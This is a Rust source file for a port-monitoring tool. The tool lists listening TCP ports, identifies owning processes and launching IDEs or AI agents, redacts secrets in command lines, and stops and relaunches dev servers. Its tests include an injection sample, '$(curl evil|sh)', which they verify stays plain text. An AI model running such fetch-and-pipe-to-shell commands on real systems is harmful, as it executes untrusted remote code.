//! Listening TCP ports and the processes that own them.

use serde::Serialize;
use sysinfo::System;

#[derive(Serialize, Clone, Debug)]
pub struct PortInfo {
    pub port: u16,
    pub pid: u32,
    pub process: String,
    /// Bound address, or "*" when listening on every interface.
    pub address: String,
    /// True for well-known OS daemons that users rarely care about (hidden by default in the UI).
    pub system: bool,
    /// IDE or AI coding agent that (transitively) launched the process.
    pub agent: Option<Agent>,
    /// Working directory of the process, `~`-shortened. Apps started from the
    /// Finder / Start menu usually report "/", CLI dev servers report their project.
    pub cwd: Option<String>,
    /// Full command line, for the tooltip.
    pub cmd: String,
    /// Short human label for the command: "vite", "dashboard/server.mjs", "http.server".
    pub label: String,
    /// What is serving the port: a framework ("vite", "next"), a runtime ("node", "python")
    /// or a known service ("ollama", "postgres"). The UI maps it to a logo.
    pub tech: Option<&'static str>,
    /// A dev server worth showing by default: runs from a project folder under the
    /// home directory, or is a known local service (ollama, postgres…).
    pub dev: bool,
    /// How this project was started, so it can be started again once closed.
    pub launch: Option<Launch>,
    /// Unix time the process started, for the "up 2d" hint.
    pub started_at: Option<u64>,
}

#[derive(Serialize, Clone, Debug)]
pub struct Launch {
    /// Stable identity: a hash of working directory + command line.
    pub key: String,
    /// Command for display, with secrets masked.
    pub display: String,
    /// Arguments that started the project, e.g. ["npm", "start"]. Relaunched as-is, never
    /// through a shell parser, and never sent to the UI.
    #[serde(skip)]
    pub argv: Vec<String>,
    /// The command line carries something that looks like a secret (a token, a password).
    #[serde(skip)]
    pub secret: bool,
    #[serde(skip)]
    pub pid: u32,
    #[serde(skip)]
    pub cwd_abs: String,
}

const SECRET_WORDS: &[&str] = &[
    "token",
    "secret",
    "password",
    "passwd",
    "pass",
    "apikey",
    "api-key",
    "api_key",
    "auth",
    "key",
    "credential",
];

fn looks_secret_name(name: &str) -> bool {
    let n = name.trim_start_matches('-').to_ascii_lowercase();
    SECRET_WORDS.iter().any(|w| {
        n == *w
            || n.ends_with(&format!("-{w}"))
            || n.ends_with(&format!("_{w}"))
            || n.contains("token")
            || n.contains("secret")
            || n.contains("password")
    })
}

fn looks_secret_value(v: &str) -> bool {
    // Long opaque strings: JWTs, base64 tokens, hex keys.
    v.len() >= 32
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || "+/=_-.".contains(c))
        && !v.contains('/')
        || v.starts_with("eyJ")
}

/// Mask secrets in argv: values after `--token`, `KEY=value` pairs with secret-ish names,
/// and long opaque strings. Returns the masked argv and whether anything was masked.
pub fn redact(argv: &[String]) -> (Vec<String>, bool) {
    let mut out = Vec::with_capacity(argv.len());
    let mut hit = false;
    let mut mask_next = false;
    for a in argv {
        if mask_next {
            out.push("•••".to_string());
            hit = true;
            mask_next = false;
            continue;
        }
        if let Some((k, _)) = a.split_once('=') {
            if looks_secret_name(k) {
                out.push(format!("{k}=•••"));
                hit = true;
                continue;
            }
        }
        if a.starts_with('-') && looks_secret_name(a) {
            mask_next = true;
            out.push(a.clone());
            continue;
        }
        if looks_secret_value(a) {
            out.push("•••".to_string());
            hit = true;
            continue;
        }
        out.push(a.clone());
    }
    (out, hit)
}

/// FNV-1a: a stable, dependency-free hash for launch identities.
fn fnv(s: &str) -> String {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in s.bytes() {
        h ^= b as u64;
        h = h.wrapping_mul(0x0100_0000_01b3);
    }
    format!("{h:016x}")
}

/// Processes that mark the top of a project's process tree: shells, terminals,
/// multiplexers and init systems. The launcher is the highest ancestor below them.
const BOUNDARIES: &[&str] = &[
    "zsh",
    "bash",
    "sh",
    "fish",
    "dash",
    "tcsh",
    "csh",
    "ksh",
    "nu",
    "pwsh",
    "powershell",
    "cmd",
    "login",
    "launchd",
    "tmux",
    "tmux: server",
    "screen",
    "sshd",
    "script",
    "sudo",
    "init",
    "systemd",
    "explorer",
    "conhost",
    "windowsterminal",
    "terminal",
    "iterm2",
    "warp",
    "ghostty",
    "alacritty",
    "kitty",
    "wezterm-gui",
];

/// Quote argv into one shell-looking line, for display only. What runs is always the argv.
fn shell_join(argv: &[String]) -> String {
    argv.iter()
        .map(|a| {
            let plain = !a.is_empty()
                && a.chars()
                    .all(|c| c.is_ascii_alphanumeric() || "-_./=:@%+,".contains(c));
            if plain {
                a.clone()
            } else if cfg!(windows) {
                format!("\"{}\"", a.replace('"', "\\\""))
            } else {
                format!("'{}'", a.replace('\'', "'\\''"))
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// The masked command line shown in the UI, built from the same argv that would run.
pub fn display_of(argv: &[String]) -> String {
    shell_join(&redact(argv).0)
}

/// Split a rewritten process title ("npm start", as npm sets it on Linux) into words.
/// Whitespace separates, single/double quotes group, backslash escapes outside single
/// quotes. Nothing else means anything: `;`, `|`, `$(…)` stay plain text inside a word.
fn split_words(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut quote: Option<char> = None;
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some('"'), '\\') => {
                let n = chars.next();
                if !matches!(n, Some('"' | '\\' | '$' | '`')) {
                    cur.push('\\');
                }
                cur.extend(n);
            }
            (Some(_), c) => cur.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                in_word = true;
            }
            (None, '\\') => {
                cur.extend(chars.next());
                in_word = true;
            }
            (None, c) if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            (None, c) => {
                cur.push(c);
                in_word = true;
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

fn argv_of(p: &sysinfo::Process) -> Vec<String> {
    let argv: Vec<String> = p
        .cmd()
        .iter()
        .map(|a| a.to_string_lossy().trim_end_matches('\0').to_string())
        .filter(|a| !a.is_empty())
        .collect();
    // A process that rewrote its title (npm does) reports one string; split it into words.
    match argv.as_slice() {
        [one] if one.contains(char::is_whitespace) => split_words(one),
        _ => argv,
    }
}

/// Walk up from the listening process while ancestors share its working directory and
/// are not a shell / terminal / agent. `npm start` -> vite + dashboard gives `npm start`.
fn find_launcher(sys: &System, pid: u32) -> Option<Launch> {
    let me = sys.process(sysinfo::Pid::from_u32(pid))?;
    let cwd = me.cwd()?.to_path_buf();
    let mut best = me;
    for _ in 0..20 {
        let Some(parent) = best.parent().and_then(|pp| sys.process(pp)) else {
            break;
        };
        if parent.cwd() != Some(cwd.as_path()) {
            break;
        }
        let exe = parent
            .exe()
            .map(|e| e.to_string_lossy().into_owned())
            .unwrap_or_default();
        // Check both the reported name and the executable: process names are not always
        // reliable (a forked child can keep its parent's name).
        let is_boundary = [
            parent.name().to_string_lossy().into_owned(),
            file_name(&exe).to_string(),
        ]
        .iter()
        .map(|n| {
            let n = n.to_ascii_lowercase();
            n.strip_suffix(".exe").unwrap_or(&n).to_string()
        })
        .any(|n| BOUNDARIES.contains(&n.as_str()));
        // Portkeeper itself is a boundary too: projects it relaunched hang off it.
        let is_portkeeper = parent.pid().as_u32() == std::process::id();
        if is_boundary || is_portkeeper || agent_for(&exe, &argv_of(parent).join(" ")).is_some() {
            break;
        }
        best = parent;
    }
    let argv = argv_of(best);
    if argv.is_empty() {
        return None;
    }
    let (masked, secret) = redact(&argv);
    let cwd_abs = cwd.to_string_lossy().into_owned();
    Some(Launch {
        key: fnv(&format!("{cwd_abs}\u{0}{}", argv.join("\u{0}"))),
        display: shell_join(&masked),
        argv,
        secret,
        pid: best.pid().as_u32(),
        cwd_abs,
    })
}

/// `~`-shortened working directory of a process, for the lock check.
pub fn cwd_of(pid: u32) -> Option<String> {
    use sysinfo::{ProcessRefreshKind, ProcessesToUpdate, UpdateKind};
    let mut sys = System::new();
    let p = sysinfo::Pid::from_u32(pid);
    sys.refresh_processes_specifics(
        ProcessesToUpdate::Some(&[p]),
        false,
        ProcessRefreshKind::nothing().with_cwd(UpdateKind::Always),
    );
    sys.process(p)
        .and_then(|proc_| proc_.cwd())
        .map(|c| crate::system::tilde(&c.to_string_lossy()))
}

/// Environment of a running process (same user only), to relaunch it faithfully.
pub fn environ(pid: u32) -> Vec<(String, String)> {
    use sysinfo::{ProcessRefreshKind, ProcessesToUpdate, UpdateKind};
    let mut sys = System::new();
    let p = sysinfo::Pid::from_u32(pid);
    sys.refresh_processes_specifics(
        ProcessesToUpdate::Some(&[p]),
        false,
        ProcessRefreshKind::nothing().with_environ(UpdateKind::Always),
    );
    sys.process(p)
        .map(|proc_| {
            proc_
                .environ()
                .iter()
                .filter_map(|kv| {
                    let kv = kv.to_string_lossy();
                    let (k, v) = kv.split_once('=')?;
                    (!k.is_empty()).then(|| (k.to_string(), v.to_string()))
                })
                .collect()
        })
        .unwrap_or_default()
}

fn file_name(path: &str) -> &str {
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

/// "python3.12" / "node.exe" -> "python" / "node"
fn stem(bin: &str) -> String {
    let b = file_name(bin).to_ascii_lowercase();
    let b = b.strip_suffix(".exe").unwrap_or(&b);
    b.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')
        .to_string()
}

const RUNTIMES: &[&str] = &[
    "node", "bun", "deno", "python", "ruby", "php", "java", "dotnet",
];

/// Turn argv into a short label that tells two ports of the same project apart.
pub fn friendly_label(argv: &[String], process: &str) -> String {
    let Some(first) = argv.first() else {
        return process.to_string();
    };
    let runtime = stem(first);
    if !RUNTIMES.contains(&runtime.as_str()) {
        return file_name(first).to_string();
    }
    let mut rest = argv[1..].iter().map(String::as_str).peekable();
    while let Some(arg) = rest.next() {
        if arg == "-m" {
            return rest.next().unwrap_or(arg).to_string(); // python -m http.server
        }
        if arg.starts_with('-') || (runtime == "deno" && arg == "run") {
            continue;
        }
        let a = arg.replace('\\', "/");
        if a.contains("node_modules/.bin/") || a.contains("node_modules/") && a.contains("/bin/") {
            return file_name(&a).trim_end_matches(".js").to_string(); // node_modules/.bin/vite
        }
        if a.starts_with('/') || a.contains(":/") {
            return file_name(&a).to_string();
        }
        return a;
    }
    runtime
}

/// Best guess at what serves the port, from its argv.
pub fn detect_tech(argv: &[String], process: &str) -> Option<&'static str> {
    const FRAMEWORKS: &[(&str, &str)] = &[
        ("vite", "vite"),
        ("next", "next"),
        ("astro", "astro"),
        ("nuxt", "nuxt"),
        ("nuxi", "nuxt"),
        ("storybook", "storybook"),
        ("wrangler", "cloudflare"),
    ];
    for arg in argv {
        let a = arg.replace('\\', "/").to_ascii_lowercase();
        let name = file_name(&a);
        for (needle, id) in FRAMEWORKS {
            if name == *needle
                || name == format!("{needle}.js")
                || a.contains(&format!("/node_modules/{needle}/"))
            {
                return Some(id);
            }
        }
    }
    let first = argv.first().map(String::as_str).unwrap_or(process);
    let s = stem(first);
    let id = match s.as_str() {
        "node" => "node",
        "bun" => "bun",
        "deno" => "deno",
        "python" => "python",
        "ruby" | "rails" | "puma" => "ruby",
        "php" | "php-fpm" => "php",
        "java" => "java",
        "dotnet" => "dotnet",
        "ollama" => "ollama",
        "postgres" | "postmaster" => "postgres",
        "redis-server" => "redis",
        "mysqld" | "mariadbd" => "mysql",
        "cloudflared" => "cloudflare",
        "docker" | "com.docker.backend" => "docker",
        _ => return None,
    };
    Some(id)
}

#[derive(Serialize, Clone, Debug, PartialEq)]
pub struct Agent {
    /// Stable identifier used by the UI to pick a logo: "claude", "cursor", "vscode"…
    pub id: &'static str,
    pub name: &'static str,
}

#[cfg(target_os = "macos")]
const SYSTEM_PROCESSES: &[&str] = &[
    "rapportd",
    "ControlCenter",
    "ControlCe",
    "sharingd",
    "AirPlayXPCHelper",
    "identityservicesd",
    "remoted",
    "Spotlight",
    "Music",
    "mDNSResponder",
    "launchd",
    "Finder",
    "Photos",
    "universalaccessd",
    "WiFiAgent",
    "bluetoothd",
    "cloudd",
    "nsurlsessiond",
    "CommCenter",
];
#[cfg(target_os = "windows")]
const SYSTEM_PROCESSES: &[&str] = &[
    "System",
    "Idle",
    "svchost.exe",
    "lsass.exe",
    "wininit.exe",
    "services.exe",
    "spoolsv.exe",
    "NVDisplay.Container.exe",
    "jhi_service.exe",
];
#[cfg(target_os = "linux")]
const SYSTEM_PROCESSES: &[&str] = &[
    "systemd",
    "systemd-resolve",
    "systemd-resolved",
    "cupsd",
    "cups-browsed",
    "avahi-daemon",
    "sshd",
];
#[cfg(not(any(target_os = "macos", target_os = "windows", target_os = "linux")))]
const SYSTEM_PROCESSES: &[&str] = &[];

/// Map a process (executable path + argv) to a known IDE or AI coding agent.
/// Matching is deliberately narrow to avoid false positives such as macOS's
/// `CursorUIViewService` or the "Codex Framework" bundled inside ChatGPT.app.
fn agent_for(exe: &str, cmd: &str) -> Option<Agent> {
    let base = exe.rsplit(['/', '\\']).next().unwrap_or(exe);
    let base_l = base.to_ascii_lowercase();
    let exe_l = exe.to_ascii_lowercase();
    let cmd_l = cmd.to_ascii_lowercase();
    // (id, label, exact basenames (lowercase), substrings in exe path or argv)
    let rules: &[(&str, &str, &[&str], &[&str])] = &[
        (
            "claude",
            "Claude Code",
            &["claude", "claude.exe"],
            &["claude-code", "@anthropic-ai/claude-code"],
        ),
        ("claude", "Claude", &[], &["/claude.app/"]),
        (
            "codex",
            "Codex",
            &["codex", "codex.exe"],
            &["@openai/codex"],
        ),
        (
            "cursor",
            "Cursor",
            &["cursor", "cursor.exe"],
            &["/cursor.app/", "cursor helper", "\\cursor\\"],
        ),
        (
            "gemini",
            "Gemini CLI",
            &["gemini", "gemini.exe"],
            &["@google/gemini-cli"],
        ),
        (
            "copilot",
            "Copilot",
            &["copilot", "copilot.exe"],
            &["copilot-language-server", "github.copilot"],
        ),
        (
            "windsurf",
            "Windsurf",
            &["windsurf", "windsurf.exe"],
            &["/windsurf.app/", "\\windsurf\\"],
        ),
        ("aider", "Aider", &["aider"], &["/aider/"]),
        (
            "opencode",
            "OpenCode",
            &["opencode", "opencode.exe"],
            &["opencode-ai"],
        ),
        ("cline", "Cline", &[], &["saoudrizwan.claude-dev"]),
        (
            "vscode",
            "VS Code",
            &["code", "code.exe", "code - insiders"],
            &[
                "/visual studio code",
                "code helper",
                "\\microsoft vs code\\",
            ],
        ),
        (
            "zed",
            "Zed",
            &["zed", "zed.exe"],
            &["/zed.app/", "/zed preview.app/"],
        ),
        (
            "jetbrains",
            "JetBrains",
            &[
                "idea",
                "webstorm",
                "pycharm",
                "phpstorm",
                "goland",
                "rubymine",
                "clion",
                "rider",
                "datagrip",
                "rustrover",
            ],
            &[
                "/jetbrains/",
                "jetbrains toolbox",
                "\\jetbrains\\",
                "intellij",
                "webstorm.app",
                "pycharm.app",
                "phpstorm.app",
                "goland.app",
                "clion.app",
                "rider.app",
                "rustrover.app",
            ],
        ),
        ("xcode", "Xcode", &[], &["/xcode.app/contents/macos/xcode"]),
    ];
    for (id, name, bases, needles) in rules {
        if bases.contains(&base_l.as_str())
            || needles
                .iter()
                .any(|n| exe_l.contains(n) || cmd_l.contains(n))
        {
            return Some(Agent { id, name });
        }
    }
    None
}

/// Walk up the parent chain of `pid` and return the closest AI agent found.
fn detect_agent(sys: &sysinfo::System, pid: u32) -> Option<Agent> {
    let mut current = sysinfo::Pid::from_u32(pid);
    for _ in 0..20 {
        let proc_ = sys.process(current)?;
        let exe = proc_
            .exe()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_else(|| proc_.name().to_string_lossy().into_owned());
        let cmd = proc_
            .cmd()
            .iter()
            .map(|a| a.to_string_lossy())
            .collect::<Vec<_>>()
            .join(" ");
        if let Some(agent) = agent_for(&exe, &cmd) {
            return Some(agent);
        }
        current = proc_.parent()?;
    }
    None
}

fn process_table() -> sysinfo::System {
    use sysinfo::{ProcessRefreshKind, RefreshKind, UpdateKind};
    System::new_with_specifics(
        RefreshKind::nothing().with_processes(
            ProcessRefreshKind::nothing()
                .with_exe(UpdateKind::Always)
                .with_cmd(UpdateKind::Always)
                .with_cwd(UpdateKind::Always),
        ),
    )
}

pub fn list() -> Result<Vec<PortInfo>, String> {
    // `listeners` only reports TCP sockets in LISTEN state, which is exactly what we want.
    let all = listeners::get_all().map_err(|e| e.to_string())?;
    let sys = process_table();
    let mut out: Vec<PortInfo> = Vec::new();
    for l in all {
        let port = l.socket.port();
        let pid = l.process.pid;
        // The same socket shows up once per IP family; keep one row per (pid, port).
        if out.iter().any(|p| p.port == port && p.pid == pid) {
            continue;
        }
        let ip = l.socket.ip();
        let address = if ip.is_unspecified() {
            "*".to_string()
        } else {
            ip.to_string()
        };
        let process = l.process.name;
        let system = SYSTEM_PROCESSES.contains(&process.as_str());
        let agent = detect_agent(&sys, pid);
        let info = sys.process(sysinfo::Pid::from_u32(pid));
        let cwd = info
            .and_then(|p| p.cwd())
            .map(|c| c.to_string_lossy().into_owned())
            .filter(|c| !c.is_empty())
            .map(|c| crate::system::tilde(&c));
        let argv: Vec<String> = info
            .map(|p| {
                p.cmd()
                    .iter()
                    .map(|a| a.to_string_lossy().into_owned())
                    .collect()
            })
            .unwrap_or_default();
        let cmd = redact(&argv).0.join(" ");
        let label = friendly_label(&argv, &process);
        let tech = detect_tech(&argv, &process);
        let in_project = cwd
            .as_deref()
            .is_some_and(|c| c.starts_with("~/") && !c.starts_with("~/Library/Containers/"));
        let dev = !system
            && process != "com.docker.backend"
            && (in_project || matches!(tech, Some("ollama" | "postgres" | "redis" | "mysql")));
        let started_at = info.map(|p| p.start_time()).filter(|t| *t > 0);
        let launch = if dev && in_project {
            find_launcher(&sys, pid)
        } else {
            None
        };
        out.push(PortInfo {
            port,
            pid,
            process,
            address,
            system,
            agent,
            cwd,
            cmd,
            label,
            tech,
            dev,
            launch,
            started_at,
        });
    }
    out.sort_by_key(|p| (p.port, p.pid));
    Ok(out)
}

/// Is the process still around? (A zombie counts as gone: it has already exited.)
fn alive(pid: u32) -> bool {
    use sysinfo::{ProcessRefreshKind, ProcessesToUpdate};
    let mut sys = System::new();
    let p = sysinfo::Pid::from_u32(pid);
    sys.refresh_processes_specifics(
        ProcessesToUpdate::Some(&[p]),
        true,
        ProcessRefreshKind::nothing(),
    );
    sys.process(p)
        .is_some_and(|proc_| proc_.status() != sysinfo::ProcessStatus::Zombie)
}

/// Stop a process: ask politely first, and if it is still running after
/// `GRACE`, kill it. `force` skips the polite step.
pub fn kill(pid: u32, force: bool) -> Result<(), String> {
    const GRACE: std::time::Duration = std::time::Duration::from_millis(1500);
    if !force {
        signal(pid, false)?;
        let deadline = std::time::Instant::now() + GRACE;
        while std::time::Instant::now() < deadline {
            if !alive(pid) {
                return Ok(());
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        if !alive(pid) {
            return Ok(());
        }
    }
    signal(pid, true)
}

/// `SIGTERM` / `SIGKILL` on Unix, `taskkill` / `taskkill /F` on Windows.
fn signal(pid: u32, force: bool) -> Result<(), String> {
    #[cfg(unix)]
    {
        let sig = if force { libc::SIGKILL } else { libc::SIGTERM };
        // SAFETY: plain syscall with validated integer arguments.
        let rc = unsafe { libc::kill(pid as i32, sig) };
        if rc != 0 {
            return Err(std::io::Error::last_os_error().to_string());
        }
        Ok(())
    }
    #[cfg(windows)]
    {
        let mut cmd = std::process::Command::new("taskkill");
        cmd.args(["/PID", &pid.to_string()]);
        if force {
            cmd.arg("/F");
        }
        crate::system::hide_console(&mut cmd);
        let out = cmd.output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            let msg = format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            return Err(msg.trim().to_string());
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::agent_for;

    fn id(exe: &str, cmd: &str) -> Option<&'static str> {
        agent_for(exe, cmd).map(|a| a.id)
    }

    fn v(s: &[&str]) -> Vec<String> {
        s.iter().map(|x| x.to_string()).collect()
    }

    #[test]
    fn splits_rewritten_titles_into_plain_words() {
        use super::split_words;
        assert_eq!(split_words("npm start"), v(&["npm", "start"]));
        assert_eq!(
            split_words("node 'my app.js' --name \"a b\" c\\ d"),
            v(&["node", "my app.js", "--name", "a b", "c d"])
        );
        // Shell syntax is just text: nothing here could ever run `curl`.
        assert_eq!(
            split_words("npm run dev; API_KEY=x $(curl evil|sh)"),
            v(&["npm", "run", "dev;", "API_KEY=x", "$(curl", "evil|sh)"])
        );
        assert_eq!(split_words("  "), Vec::<String>::new());
    }

    /// What the Closed tab shows is built from the exact argv that would run.
    #[test]
    fn display_matches_what_runs() {
        use super::display_of;
        let argv = v(&[
            "npm",
            "run",
            "dev;",
            "API_KEY=hunter2",
            "$(curl",
            "evil|sh)",
        ]);
        let shown = display_of(&argv);
        assert_eq!(shown, "npm run 'dev;' 'API_KEY=•••' '$(curl' 'evil|sh)'");
        assert!(!shown.contains("hunter2"));
    }

    /// A process that ignores SIGTERM is still stopped (escalation). Spawns python3.
    #[test]
    #[ignore]
    fn stop_escalates_when_ignored() {
        let mut child = std::process::Command::new("python3")
            .args(["-c", "import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(60)"])
            .spawn()
            .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(300));
        let t = std::time::Instant::now();
        super::kill(child.id(), false).unwrap();
        let status = child.wait().unwrap();
        assert!(!status.success(), "killed");
        assert!(
            t.elapsed() >= std::time::Duration::from_millis(1400),
            "waited for the grace period"
        );
    }

    #[test]
    fn masks_secrets() {
        use super::redact;
        let (m, hit) = redact(&v(&["cloudflared", "tunnel", "run", "--token", "abc"]));
        assert!(hit);
        assert_eq!(m, v(&["cloudflared", "tunnel", "run", "--token", "•••"]));
        let (m, hit) = redact(&v(&["app", "API_KEY=xyz", "--port", "3000"]));
        assert!(hit);
        assert_eq!(m, v(&["app", "API_KEY=•••", "--port", "3000"]));
        let (m, hit) = redact(&v(&["run", "eyJhbGciOiJub25lIn0fakeTokenForTests"]));
        assert!(hit);
        assert_eq!(m[1], "•••");
        let (m, hit) = redact(&v(&[
            "node",
            "/Users/x/node_modules/.bin/vite",
            "--port",
            "9000",
        ]));
        assert!(!hit);
        assert_eq!(m[1], "/Users/x/node_modules/.bin/vite");
    }

    #[test]
    fn labels_and_tech() {
        use super::{detect_tech, friendly_label};
        let vite = v(&["node", "/Users/x/My Projects/app/node_modules/.bin/vite"]);
        assert_eq!(friendly_label(&vite, "node"), "vite");
        assert_eq!(detect_tech(&vite, "node"), Some("vite"));
        let dash = v(&["node", "dashboard/server.mjs"]);
        assert_eq!(friendly_label(&dash, "node"), "dashboard/server.mjs");
        assert_eq!(detect_tech(&dash, "node"), Some("node"));
        let py = v(&["/opt/homebrew/bin/python3.14", "-m", "http.server", "4173"]);
        assert_eq!(friendly_label(&py, "Python"), "http.server");
        assert_eq!(detect_tech(&py, "Python"), Some("python"));
        let ollama = v(&["/opt/homebrew/bin/ollama", "serve"]);
        assert_eq!(friendly_label(&ollama, "ollama"), "ollama");
        assert_eq!(detect_tech(&ollama, "ollama"), Some("ollama"));
        assert_eq!(friendly_label(&[], "Spotify"), "Spotify");
    }

    #[test]
    fn detects_agents_and_ides_narrowly() {
        assert_eq!(
            id(
                "/Users/x/claude-code/2.1/claude.app/Contents/MacOS/claude",
                ""
            ),
            Some("claude")
        );
        assert_eq!(
            id(
                "/usr/local/bin/node",
                "node /lib/node_modules/@openai/codex/bin/codex.js"
            ),
            Some("codex")
        );
        assert_eq!(
            id("/Applications/Cursor.app/Contents/MacOS/Cursor", ""),
            Some("cursor")
        );
        assert_eq!(id("/Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper (Plugin).app/Contents/MacOS/Code Helper (Plugin)", ""), Some("vscode"));
        assert_eq!(
            id("/Applications/WebStorm.app/Contents/MacOS/webstorm", ""),
            Some("jetbrains")
        );
        assert_eq!(id("/System/Library/.../CursorUIViewService", ""), None);
        assert_eq!(id("/Applications/ChatGPT.app/Contents/Frameworks/Codex Framework.framework/Helpers/Codex (Service)", ""), None);
        assert_eq!(id("/bin/zsh", "-zsh"), None);
        // Command line tools that live inside Xcode.app are not "Xcode".
        assert_eq!(
            id(
                "/Applications/Xcode.app/Contents/Developer/usr/bin/make",
                "make tunnel"
            ),
            None
        );
        assert_eq!(
            id("/Applications/Xcode.app/Contents/MacOS/Xcode", ""),
            Some("xcode")
        );
    }

    /// End to end: start a throwaway server, find it, stop it like the UI does, then
    /// reactivate it like the Closed tab does. Ignored by default because it spawns
    /// `python3`; run with `cargo test -- --ignored`.
    #[test]
    #[ignore]
    fn finds_stops_and_relaunches_a_real_server() {
        use std::net::TcpListener;
        use std::time::{Duration, Instant};

        let wait_for = |port: u16, present: bool| {
            let deadline = Instant::now() + Duration::from_secs(10);
            loop {
                let hit = super::list().unwrap().into_iter().find(|p| p.port == port);
                if hit.is_some() == present {
                    return hit;
                }
                assert!(
                    Instant::now() < deadline,
                    "port {port} present={present} timed out"
                );
                std::thread::sleep(Duration::from_millis(100));
            }
        };

        let port = TcpListener::bind("127.0.0.1:0")
            .unwrap()
            .local_addr()
            .unwrap()
            .port();
        // Started from a shell in the crate folder, like a dev server you start by hand:
        // the shell is the boundary, so the launcher is the python process itself.
        let mut shell = std::process::Command::new("/bin/sh")
            // "& wait" keeps sh alive as the parent (a lone command would be exec'd in place).
            .args([
                "-c",
                &format!("python3 -m http.server {port} --bind 127.0.0.1 & wait"),
            ])
            .current_dir(env!("CARGO_MANIFEST_DIR"))
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("sh and python3 available");

        let found = wait_for(port, true).unwrap();
        let cleanup = |pid: u32| {
            let _ = super::kill(pid, true);
        };
        let check = std::panic::catch_unwind(|| {
            assert_eq!(found.label, "http.server");
            assert_eq!(found.tech, Some("python"));
            let launch = found
                .launch
                .clone()
                .expect("launch info for a project process");
            // Homebrew's `python3` re-spawns Python.app as a child, so the launcher may be
            // the `python3` parent; either way it must stop below the shell.
            let shown = launch.argv.join(" ");
            assert!(!shown.starts_with("/bin/sh"), "{shown}");
            assert!(shown.contains("http.server"), "{shown}");
            launch
        });
        let launch = match check {
            Ok(l) => l,
            Err(e) => {
                cleanup(found.pid);
                std::panic::resume_unwind(e);
            }
        };
        let env = super::environ(launch.pid);
        assert!(env.iter().any(|(k, _)| k == "PATH"), "captured PATH");

        super::kill(found.pid, false).unwrap();
        let _ = shell.wait();
        wait_for(port, false);

        let log = std::env::temp_dir().join("portkeeper-test.log");
        crate::launch::spawn_detached(&launch.argv, &launch.cwd_abs, Some(&env), &log).unwrap();
        let again = wait_for(port, true).unwrap();
        cleanup(again.pid);
        assert_eq!(again.launch.map(|l| l.key), Some(launch.key));
        wait_for(port, false);
    }
}
